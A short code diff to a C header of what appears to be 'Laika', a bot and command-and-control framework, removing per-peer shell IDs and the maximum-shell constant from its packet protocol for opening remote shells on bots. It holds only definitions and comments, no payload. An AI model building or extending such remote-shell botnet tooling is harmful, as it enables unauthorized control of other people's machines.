@@ -11,8 +11,6 @@
 #define LAIKA_HOSTNAME_LEN 64
 #define LAIKA_IPV4_LEN 16
 
-/* max number of concurrent shells per peer */
-#define LAIKA_MAX_SHELLS 16
 #define LAIKA_SHELL_DATA_MAX_LENGTH 256
 
 /* first handshake between peer & cnc works as so:
@@ -89,11 +87,9 @@ enum {
     LAIKAPKT_AUTHENTICATED_SHELL_OPEN_RES, /* panel requesting cnc open a shell on bot */
     /* layout of LAIKAPKT_AUTHENTICATE_OPEN_SHELL_REQ
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
-    *   uint16_t shellID; -- shell id of shell opened on bot
     */
     LAIKAPKT_AUTHENTICATED_SHELL_DATA, /* if sent to cnc, writes data to stdin of shell. if sent to panel, writes to 'stdout' of shell */
     /* layout of LAIKAPKT_SHELL_DATA
-    *   uint16_t shellID;
     *   char buf[VAR_PACKET_LENGTH];
     */
     LAIKAPKT_MAXNONE
